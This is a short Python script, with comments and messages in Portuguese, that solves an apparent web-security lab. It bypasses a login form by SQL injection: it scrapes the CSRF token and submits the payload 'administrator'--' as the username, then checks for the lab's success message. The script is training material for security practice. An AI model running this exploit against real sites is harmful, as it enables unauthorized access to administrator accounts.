"""
Lab: SQL injection vulnerability allowing login bypass

Objetivo:
Explorar uma SQL Injection no função de login para logar como o usuário 'administrator'.
"""

import requests
from bs4 import BeautifulSoup as bs

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

PAYLOAD = "administrator'--"

target_url = input("URL do laboratório: ").rstrip("/")

session = requests.Session()

login_page = session.get(f"{target_url}/login")

csrf_token = bs(login_page.text,"html.parser").find(
    "input",{"name":"csrf"}
)["value"]

data = {
    "csrf": csrf_token,
    "username": PAYLOAD,
    "password": "pass"
}

session.post(
    f"{target_url}/login",
    data=data
)

check = session.get(target_url)

if "Congratulations" in check.text:
    print(f"{GREEN}[+] Vulnerabilidade explorada.{RESET}")
else:
    print(f"{RED}[-] Exploração não confirmada.{RESET}")